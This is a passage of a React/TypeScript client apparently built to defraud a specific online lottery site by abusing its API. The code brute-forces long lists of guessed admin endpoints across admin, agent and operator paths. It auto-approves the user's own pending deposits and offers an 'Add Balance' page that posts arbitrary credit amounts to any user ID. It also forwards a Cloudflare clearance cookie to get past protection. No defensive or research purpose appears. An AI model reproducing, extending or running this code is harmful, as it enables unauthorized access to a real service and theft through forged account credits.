          "AdminConfirmRecharge", "RechargeConfirm", "AuditRecharge",
          "PassRecharge", "ApproveRecharge", "RechargePass", "ManualRecharge",
          "AdminRecharge", "RechargeApprove", "ConfirmDeposit", "AdminApproveRecharge",
          // extended scan list
          "RechargeAudit", "RechargeCheck", "RechargeVerify", "RechargeComplete", "RechargeFinish",
          "RechargeOk", "RechargeApproved", "PassDeposit", "AuditDeposit", "DepositApprove",
          "RechargeAuditPass", "AuditPassRecharge", "PassAuditRecharge",
          "ConfirmRechargeOrder", "MemberRechargeConfirm", "UserRechargeConfirm",
          "RechargeNotify", "PaySuccessNotify", "PayCallback", "RechargeCallback",
          "AdminManualRecharge", "SystemRecharge", "BackendRecharge", "OperatorRecharge",
        ];

    // Base paths to try (webapi first via apiPost, then admin/agent/operator via ck-path)
    const BASES = ["webapi", "admin", "agent", "operator", "manage", "backend"];

    const isNotExistErr = (m: string) =>
      m.includes("not found") || m.includes("404") || m.includes("no such") ||
      m.includes("url is not exist") || m.includes("url not exist") || m.includes("url does not exist") ||
      m.includes("interface") || m.includes("method not") || m.includes("no route") ||
      m.includes("invalid url") || m.includes("not exist") || m.includes("unknown_base");

    const tryApiPathBase = async (base: string, ep: string) => {
      const auth = buildAuth(session);
      const res = await fetch(`/api/proxy/ck-path/${base}/${ep}`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: auth,
          "x-ck-token-header": (session.tokenHeader || "Bearer").trim(),
          ...(session.cfClearance ? { "x-ck-cf-clearance": session.cfClearance } : {}),
        },
        body: JSON.stringify(richPayload),
      });
      return parseApiJson(await res.text(), res.status);
    };

    const refreshDeposits = () => {
      setTimeout(() => {
        setDeposits([]);
        apiPost("GetRechargeRecord", { pageIndex: 1, pageSize: 20 }, session)
          .then(d => setDeposits(extractList(d))).catch(() => {});
      }, 800);
    };

    const triedLabels: string[] = [];
    let lastErr = "";

    for (const base of BASES) {
      for (const ep of ENDPOINTS) {
        const label = `[${base}] ${ep}`;
        triedLabels.push(label);
        try {
          const result = base === "webapi"
            ? await apiPost(ep, richPayload, session)
            : await tryApiPathBase(base, ep);
          // Success — CKLottery returns code 0 on success; treat any non-error response as ok
          const code = result?.code ?? result?.status ?? result?.Code;
          const msg  = String(result?.msg ?? result?.message ?? "").toLowerCase();
          if (code !== 0 && code !== "0" && code !== undefined && isNotExistErr(msg)) {
            // endpoint exists but returned a domain error — keep cascading
            lastErr = String(result?.msg ?? result?.message ?? JSON.stringify(result));
            continue;
          }
          setApproveStates(p => ({ ...p, [orderNo]: { loading: false, ok: true, err: "" } }));
          refreshDeposits();
          return;
        } catch (e) {
          lastErr = String(e);
          if (!isNotExistErr(lastErr.toLowerCase())) break; // non-404 error — stop
        }
      }
    }
    setApproveStates(p => ({
      ...p,
      [orderNo]: { loading: false, ok: false, err: `${lastErr}\n(Tried: ${triedLabels.slice(0, 8).join(", ")}…)` },
    }));
  }, [session]);

  // Auto-approve any pending deposits as soon as they load
  useEffect(() => {
    deposits.forEach((item) => {
      const stateVal = item.state ?? item.status;
      const isPending = stateVal === 0 || stateVal === "0";
      if (!isPending) return;
      const orderNo = String(
        item.rechargeNumber ?? item.rechargeSNum ?? item.orderNo ?? item.serialNo ?? item.rechargeNo ?? item.id ?? ""
      );
      if (!orderNo || autoApprovedRef.current.has(orderNo)) return;
      autoApprovedRef.current.add(orderNo);
      approveDeposit(item);
    });
  }, [deposits, approveDeposit]);

  const loadWithdraws = useCallback(() => {
    setWithdrawsLoading(true); setWithdrawsError("");
    apiPost("GetWithdrawLog", { pageIndex: 1, pageSize: 20 }, session)
      .then((d) => setWithdraws(extractList(d)))
      .catch((e) => setWithdrawsError(String(e)))
      .finally(() => setWithdrawsLoading(false));
  }, [session]);

  const loadGames = useCallback(() => {
    setGamesLoading(true); setGamesError("");
    apiPost("BetRecords", { pageIndex: 1, pageSize: 20 }, session)
      .then((d) => setGames(extractList(d)))
      .catch(() => apiPost("BettingRecord", { pageIndex: 1, pageSize: 20 }, session)
        .then((d) => setGames(extractList(d)))
        .catch((e) => setGamesError(String(e))))
      .finally(() => setGamesLoading(false));
  }, [session]);

  const loadTransactions = useCallback(() => {
    setTransactionsLoading(true); setTransactionsError("");
    apiPost("RecordList", { pageIndex: 1, pageSize: 20 }, session)
      .then((d) => setTransactions(extractList(d)))
      .catch(() => apiPost("AllRecords", { pageIndex: 1, pageSize: 20 }, session)
        .then((d) => setTransactions(extractList(d)))
        .catch((e) => setTransactionsError(String(e))))
      .finally(() => setTransactionsLoading(false));
  }, [session]);

  function handleCfFix(cfVal: string) {
    onUpdateSession({ cfClearance: cfVal });
    // Reset all data so it reloads with the new cf_clearance
    setDepositsError(""); setWithdrawsError(""); setGamesError(""); setTransactionsError(""); setWalletsError("");
    setDeposits([]); setWithdraws([]); setGames([]); setTransactions([]); setWallets(null);
    setReloadKey((k) => k + 1);
  }

  // When reloadKey increments (after CF fix), reload data for the active page
  useEffect(() => {
    if (reloadKey === 0) return;
    if (page === "deposit") loadDeposits();
    if (page === "withdraw") loadWithdraws();
    if (page === "game") loadGames();
    if (page === "transaction") loadTransactions();
    if (page === "wallet") loadWallets();
  }, [reloadKey]); // eslint-disable-line react-hooks/exhaustive-deps

  function navTo(p: Page) {
    if (p === "wallet" && !wallets && !walletsLoading) loadWallets();
    if (p === "deposit" && deposits.length === 0 && !depositsLoading) loadDeposits();
    if (p === "withdraw" && withdraws.length === 0 && !withdrawsLoading) loadWithdraws();
    if (p === "game" && games.length === 0 && !gamesLoading) loadGames();
    if (p === "transaction" && transactions.length === 0 && !transactionsLoading) loadTransactions();
    setPage(p);
  }

  if (page === "home") return <GameHomePage onNav={navTo} onLogout={onLogout} wingoResults={wingoResults} wingoLoading={wingoLoading} />;
  if (page === "vip") return <VIPPage vipData={vipData} claims={claims} userInfo={userInfo} onBack={() => setPage("main")} />;
  if (page === "wallet") return <WalletPage wallets={wallets} loading={walletsLoading} error={walletsError} onBack={() => setPage("main")} />;
  if (page === "depositNew") return <DepositNewPage session={session} onBack={() => setPage("deposit")} onLogout={onLogout} />;

  if (page === "deposit") return (
    <SubPage title="📥 Deposit History" onBack={() => setPage("main")}>
      {/* Add money CTA */}
      <button type="button" onClick={() => setPage("depositNew")}
        className="w-full flex items-center justify-between bg-gradient-to-r from-blue-500 to-blue-600 text-white rounded-2xl px-5 py-4 mb-4 shadow active:opacity-90">
        <div className="flex items-center gap-3">
          <span className="text-2xl">💰</span>
          <div className="text-left">
            <div className="font-bold text-base">Add Money</div>
            <div className="text-blue-100 text-xs">Deposit MMK to your account</div>
          </div>
        </div>
        <span className="text-2xl">›</span>
      </button>
      <div className="text-xs font-semibold text-gray-400 uppercase tracking-wide mb-2 px-1">Deposit History</div>
      <ListState loading={depositsLoading} error={depositsError} empty={!depositsLoading && !depositsError && deposits.length === 0} onCfFix={handleCfFix} onRetry={loadDeposits} />
      {!depositsLoading && !depositsError && deposits.length > 0 && (
        <div className="space-y-3">
          {deposits.map((item, i) => {
            const amt = pick(item, ["rechargeAmount", "money", "amount", "rechargeMoney", "actualAmount", "orderAmount", "price"]);
            const dt = pick(item, ["createTime", "addTime", "tradeTime", "time", "date", "orderTime"]);
            const statusStr = pick(item, ["statusText", "statusTip", "statusName", "statusStr"]);
            const skipKeys = ["status", "rechargeAmount", "money", "amount", "rechargeMoney", "actualAmount", "orderAmount", "price",
              "createTime", "addTime", "tradeTime", "time", "date", "orderTime",
              "statusText", "statusTip", "statusName", "statusStr"];
            // Pending = state/status is 0 (not yet approved)
            const stateVal = item.state ?? item.status;
            const isPending = stateVal === 0 || stateVal === "0";
            const orderNo = String(item.rechargeNumber ?? item.rechargeSNum ?? item.orderNo ?? item.serialNo ?? item.rechargeNo ?? item.id ?? i);
            const apv = approveStates[orderNo];
            return (
              <div key={i} className="bg-white rounded-2xl shadow-sm p-4">
                <div className="flex justify-between items-start mb-2">
                  <div>
                    <div className="text-base font-bold text-gray-900">
                      {amt !== undefined ? `K${Number(amt).toLocaleString()}` : "K—"}
                    </div>
                    <div className="text-xs text-gray-400 mt-0.5">{dt !== undefined ? String(dt) : "—"}</div>
                  </div>
                  <StatusBadge status={item.state ?? item.status} str={statusStr as string | undefined} />
                </div>
                <RecordFields item={item} skip={skipKeys} />
                {/* Auto-approve status for pending orders */}
                {isPending && (
                  <div className="mt-3 pt-3 border-t border-gray-100">
                    {apv?.ok ? (
                      <div className="text-green-600 text-sm font-medium flex items-center gap-1.5">
                        <span>✅</span> Approved successfully! Refreshing…
                      </div>
                    ) : apv?.loading ? (
                      <div className="text-blue-500 text-sm flex items-center gap-1.5">
                        <span className="animate-spin">⏳</span> Auto-approving…
                      </div>
                    ) : apv?.err ? (
                      <div className="space-y-2">
                        <div className="text-red-500 text-xs break-all bg-red-50 rounded-lg p-2">{apv.err.split("\n")[0]}</div>
                        <div className="flex gap-2 items-center">
                          <input
                            type="text"
                            placeholder="Custom endpoint (e.g. AdminPassRecharge)"
                            value={approveCustomEndpoint[orderNo] ?? ""}
                            onChange={e => setApproveCustomEndpoint(p => ({ ...p, [orderNo]: e.target.value }))}
                            className="flex-1 border border-gray-200 rounded-xl px-3 py-2 text-xs text-gray-800 bg-gray-50 focus:outline-none focus:border-blue-400"
                          />
                          <button
                            type="button"
                            onClick={() => approveDeposit(item, approveCustomEndpoint[orderNo])}
                            className="bg-green-500 text-white px-3 py-2 rounded-xl font-semibold text-xs active:opacity-80"
                          >
                            Retry
                          </button>
                        </div>
                      </div>
                    ) : null}
                  </div>
                )}
              </div>
            );
          })}
        </div>
      )}
    </SubPage>
  );

  if (page === "withdraw") return (
    <SubPage title="📤 Withdraw History" onBack={() => setPage("main")}>
      <ListState loading={withdrawsLoading} error={withdrawsError} empty={!withdrawsLoading && !withdrawsError && withdraws.length === 0} onCfFix={handleCfFix} onRetry={loadWithdraws} />
      {!withdrawsLoading && !withdrawsError && withdraws.length > 0 && (
        <div className="space-y-3">
          {withdraws.map((item, i) => {
            const amt = pick(item, ["withdrawAmount", "money", "amount", "withdrawMoney", "actualAmount", "orderAmount"]);
            const dt = pick(item, ["createTime", "addTime", "tradeTime", "time", "date", "orderTime"]);
            const statusStr = pick(item, ["statusText", "statusTip", "statusName", "statusStr"]);
            const skipKeys = ["status", "withdrawAmount", "money", "amount", "withdrawMoney", "actualAmount", "orderAmount",
              "createTime", "addTime", "tradeTime", "time", "date", "orderTime",
              "statusText", "statusTip", "statusName", "statusStr"];
            return (
              <div key={i} className="bg-white rounded-2xl shadow-sm p-4">
                <div className="flex justify-between items-start mb-2">
                  <div>
                    <div className="text-base font-bold text-gray-900">
                      {amt !== undefined ? `K${amt}` : "K—"}
                    </div>
                    <div className="text-xs text-gray-400 mt-0.5">{dt !== undefined ? String(dt) : "—"}</div>
                  </div>
                  <StatusBadge status={item.status} str={statusStr as string | undefined} />
                </div>
                <RecordFields item={item} skip={skipKeys} />
              </div>
            );
          })}
        </div>
      )}
    </SubPage>
  );

  if (page === "game") return (
    <SubPage title="🎮 Game History" onBack={() => setPage("main")}>
      <ListState loading={gamesLoading} error={gamesError} empty={!gamesLoading && !gamesError && games.length === 0} onCfFix={handleCfFix} onRetry={loadGames} />
      {!gamesLoading && !gamesError && games.length > 0 && (
        <div className="space-y-3">
          {games.map((item, i) => (
            <div key={i} className="bg-white rounded-2xl shadow-sm p-4">
              <div className="flex justify-between items-start mb-1">
                <div className="text-sm font-bold text-gray-800">{String(item.gameName ?? item.gameCode ?? item.typeName ?? `Bet #${i + 1}`)}</div>
                <div className={`text-sm font-bold ${Number(item.winAmount ?? item.profit ?? 0) >= 0 ? "text-green-500" : "text-red-500"}`}>
                  {Number(item.winAmount ?? item.profit ?? 0) >= 0 ? "+" : ""}K{String(item.winAmount ?? item.profit ?? "—")}
                </div>
              </div>
              <div className="grid grid-cols-2 gap-1 mt-1">
                {item.betAmount !== undefined && <div className="text-xs text-gray-400">Bet: <span className="text-gray-600">K{String(item.betAmount)}</span></div>}
                {item.createTime != null && <div className="text-xs text-gray-400">{String(item.createTime)}</div>}
              </div>
            </div>
          ))}
        </div>
      )}
    </SubPage>
  );

  if (page === "transaction") return (
    <SubPage title="💸 Transaction History" onBack={() => setPage("main")}>
      <ListState loading={transactionsLoading} error={transactionsError} empty={!transactionsLoading && !transactionsError && transactions.length === 0} onCfFix={handleCfFix} onRetry={loadTransactions} />
      {!transactionsLoading && !transactionsError && transactions.length > 0 && (
        <div className="space-y-3">
          {transactions.map((item, i) => (
            <div key={i} className="bg-white rounded-2xl shadow-sm p-4">
              <div className="flex justify-between items-center mb-1">
                <div>
                  <div className="text-sm font-semibold text-gray-800">{String(item.typeName ?? item.type ?? item.remark ?? `#${i + 1}`)}</div>
                  <div className="text-xs text-gray-400">{String(item.createTime ?? item.time ?? "—")}</div>
                </div>
                <div className={`text-sm font-bold ${Number(item.amount ?? 0) >= 0 ? "text-green-500" : "text-red-500"}`}>
                  {Number(item.amount ?? 0) >= 0 ? "+" : ""}K{String(item.amount ?? "—")}
                </div>
              </div>
            </div>
          ))}
        </div>
      )}
    </SubPage>
  );

  if (page === "addBalance") {
    const uid = Number(userInfo?.userId ?? userInfo?.id ?? userInfo?.uid ?? 0);

    // All endpoint candidates to probe — recharge/admin/balance related
    const SCAN_ENDPOINTS = [
      // Recharge approval
      "ConfirmRecharge","ManualRechargeSuccess","RechargeSuccess","AdminConfirmRecharge",
      "RechargeConfirm","AuditRecharge","PassRecharge","ApproveRecharge","RechargePass",
      "ManualRecharge","AdminRecharge","RechargeApprove","ConfirmDeposit","AdminApproveRecharge",
      "RechargeAudit","RechargeCheck","RechargeVerify","RechargeComplete","RechargeFinish",
      "RechargeOk","RechargeApproved","PassDeposit","AuditDeposit","DepositApprove",
      // Balance add/gift
      "GiftMoney","AddBalance","ManualTopup","GiftRecharge","AddUserBalance",
      "AdminAddBalance","AdminGiftMoney","GiftAmount","CreditBalance","AddCredit",
      "AdminManualRecharge","ManualCredit","RechargeByAdmin","DirectRecharge","AdminTopup",
      "AddMoney","CreditMoney","BonusMoney","GiftBonus","AddBonus",
      "AdminCredit","AdminTopUp","TopupBalance","DepositBalance","ManualDeposit",
      // User management
      "UpdateUserBalance","SetUserBalance","ModifyBalance","AdjustBalance",
      "AdminUpdateBalance","AdminSetBalance","AdminModifyBalance","ChangeBalance",
      // Transaction / order
      "CreateManualOrder","AdminCreateOrder","ManualOrder","AdminOrder",
      "CreateGiftOrder","GiftOrder","BonusOrder","AdminBonusOrder",
      // Agent / transfer
      "AgentTransfer","TransferMoney","AgentAddBalance","AgentGift",
      "AgentCredit","AgentTopup","TransferToUser","SendMoney",
      // Misc admin
      "AdminOperation","AdminAction","AdminRechargeManual","SystemRecharge",
      "SystemAddBalance","BackendRecharge","BackendAddBalance","OperatorRecharge",
    ];

    const SCAN_BASE_PATHS = [
      "https://ckygjf6r.com/api/webapi",
      "https://ckygjf6r.com/api/admin",
      "https://ckygjf6r.com/api/operator",
      "https://ckygjf6r.com/api/agent",
      "https://ckygjf6r.com/api/manage",
      "https://ckygjf6r.com/api/backend",
      "https://ckygjf6r.com/manage/api",
      "https://ckygjf6r.com/admin/api",
    ];

    async function runScan() {
      setScanRunning(true); setScanResults([]); setScanDone(false);
      const results: { ep: string; exists: boolean; msg: string }[] = [];
      // Probe every endpoint against every base path
      for (const base of SCAN_BASE_PATHS) {
        for (const ep of SCAN_ENDPOINTS) {
          const label = `[${base.split("/api/")[1] ?? base.split("/").pop()}] ${ep}`;
          const { exists, msg } = await probeEndpoint(base, ep, session);
          results.push({ ep: label, exists, msg });
          if (exists) setScanResults([...results]); // update immediately on a hit
        }
      }
      setScanResults([...results]);
      setScanRunning(false); setScanDone(true);
    }

    async function doAddBalance() {
      const amt = Number(addBalAmount);
      if (!amt || amt <= 0) return;
      const targetUid = Number(addBalUserId) || uid;
      setAddBalLoading(true); setAddBalResult(null);
      const existingEndpoints = scanResults.filter(r => r.exists).map(r => r.ep);
      const customList = addBalCustomEp.trim() ? [addBalCustomEp.trim()] : [];
      const balanceEps = existingEndpoints.length > 0
        ? [...customList, ...existingEndpoints]
        : [...customList,
            "GiftMoney","AddBalance","ManualTopup","GiftRecharge","AddUserBalance",
            "AdminAddBalance","AdminGiftMoney","GiftAmount","CreditBalance","AddCredit",
            "AdminManualRecharge","ManualCredit","RechargeByAdmin","DirectRecharge","AdminTopup",
          ];
      let lastErr = "";
      for (const ep of balanceEps) {
        try {
          await apiPost(ep, { amount: amt, money: amt, userId: targetUid, uid: targetUid, memberId: targetUid }, session);
          setAddBalResult({ ok: true, msg: `✅ Success via "${ep}"!`, ep });
          setAddBalLoading(false);
          return;
        } catch (e) {
          lastErr = String(e);
          const m = lastErr.toLowerCase();
          const isNotExist = m.includes("not exist") || m.includes("not found") || m.includes("no route") || m.includes("404") || m.includes("url");
          if (!isNotExist) break;
        }
      }
      setAddBalResult({ ok: false, msg: lastErr });
      setAddBalLoading(false);
    }

    const existingEps = scanResults.filter(r => r.exists);
    const presets = [5000, 10000, 20000, 44000, 50000, 100000];

    return (
      <SubPage title="➕ Add Balance" onBack={() => setPage("main")}>

        {/* ── SCANNER ── */}
        <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
          <div className="flex items-center justify-between mb-2">
            <div>
              <div className="text-sm font-semibold text-gray-800">🔍 Endpoint Scanner</div>
              <div className="text-xs text-gray-400 mt-0.5">Probes {SCAN_ENDPOINTS.length} endpoints — finds which ones exist</div>
            </div>
            <button
              type="button"
              disabled={scanRunning}
              onClick={runScan}
              className="bg-blue-500 disabled:bg-blue-300 text-white text-xs font-bold px-4 py-2 rounded-xl active:opacity-80"
            >
              {scanRunning ? "Scanning…" : scanDone ? "Re-scan" : "Scan Now"}
            </button>
          </div>

          {scanRunning && (
            <div className="text-xs text-gray-500 mb-2">
              {scanResults.length}/{SCAN_ENDPOINTS.length} checked…
            </div>
          )}

          {scanResults.length > 0 && (
            <div className="space-y-1 max-h-48 overflow-y-auto mt-2">
              {existingEps.length > 0 && (
                <div className="text-xs font-semibold text-green-600 mb-1">✅ Endpoints that EXIST ({existingEps.length}):</div>
              )}
              {existingEps.map(r => (
                <div key={r.ep} className="flex items-start gap-2 bg-green-50 rounded-lg px-3 py-1.5">
                  <span className="text-green-500 text-xs font-bold shrink-0">EXISTS</span>
                  <div className="min-w-0">
                    <span className="text-xs font-mono font-bold text-green-800">{r.ep}</span>
                    <div className="text-xs text-green-600 break-all leading-tight">{r.msg.slice(0, 80)}</div>
                  </div>
                </div>
              ))}
              {scanDone && existingEps.length === 0 && (
                <div className="text-xs text-gray-500 italic">No matching endpoints found yet. Try again after logging in as admin.</div>
              )}
            </div>
          )}
        </div>

        {/* ── ADD BALANCE ── */}
        <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
          <div className="text-sm font-semibold text-gray-700 mb-3">Amount (MMK)</div>
          <div className="flex items-center gap-2 border border-gray-200 rounded-xl px-4 py-3 bg-gray-50 mb-3">
            <span className="text-gray-400 text-base font-medium">K</span>
            <input type="number" value={addBalAmount} onChange={e => setAddBalAmount(e.target.value)}
              className="flex-1 bg-transparent text-xl font-bold text-gray-900 outline-none" inputMode="numeric" />
          </div>
          <div className="grid grid-cols-3 gap-2">
            {presets.map(p => (
              <button key={p} type="button" onClick={() => setAddBalAmount(String(p))}
                className={`py-2 rounded-xl text-sm font-semibold border transition-colors ${Number(addBalAmount) === p ? "bg-blue-500 text-white border-blue-500" : "bg-gray-50 text-gray-700 border-gray-200"}`}>
                K{p.toLocaleString()}
              </button>
            ))}
          </div>
        </div>

        <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
          <div className="text-sm font-semibold text-gray-700 mb-2">Target User ID</div>
          <input type="number" placeholder={uid ? `Your ID: ${uid}` : "User ID"} value={addBalUserId}
            onChange={e => setAddBalUserId(e.target.value)}
            className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 bg-gray-50 focus:outline-none focus:border-blue-400"
            inputMode="numeric" />
          {uid > 0 && !addBalUserId && <p className="text-xs text-gray-400 mt-1.5">Leave blank to credit your own account (ID: {uid})</p>}
        </div>

        <div className="bg-white rounded-2xl shadow-sm p-4 mb-4">
          <div className="text-sm font-semibold text-gray-700 mb-2">Custom Endpoint <span className="text-gray-400 font-normal">(optional)</span></div>
          <input type="text" placeholder="Endpoint name from scanner results or admin docs"
            value={addBalCustomEp} onChange={e => setAddBalCustomEp(e.target.value)}
            className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 bg-gray-50 focus:outline-none focus:border-blue-400" />
          {existingEps.length > 0 && (
            <div className="flex flex-wrap gap-1 mt-2">
              {existingEps.map(r => (
                <button key={r.ep} type="button" onClick={() => setAddBalCustomEp(r.ep)}
                  className="text-xs bg-green-100 text-green-700 rounded-lg px-2 py-0.5 font-mono active:opacity-70">
                  {r.ep}
                </button>
              ))}
            </div>
          )}
        </div>

        {addBalResult && (
          addBalResult.ok
            ? <div className="bg-green-50 border border-green-200 rounded-2xl p-4 mb-4 flex items-center gap-3">
                <span className="text-2xl">✅</span>
                <div className="text-green-800 font-semibold text-sm">{addBalResult.msg}</div>
              </div>
            : <div className="bg-red-50 border border-red-200 rounded-2xl p-4 mb-4 text-red-700 text-xs break-all">{addBalResult.msg}</div>
        )}

        <button type="button" disabled={addBalLoading || !addBalAmount || Number(addBalAmount) <= 0}
          onClick={doAddBalance}
          className="w-full bg-green-500 disabled:bg-green-300 text-white py-4 rounded-2xl font-bold text-base shadow active:opacity-80 mb-16">
          {addBalLoading ? "Trying endpoints…" : `➕ Add K${Number(addBalAmount || 0).toLocaleString()}`}
        </button>
      </SubPage>
    );
  }

  return <MainPage claims={claims} userInfo={userInfo} balance={balance} tokenExpired={tokenExpired} onNav={navTo} onLogout={onLogout} />;
}
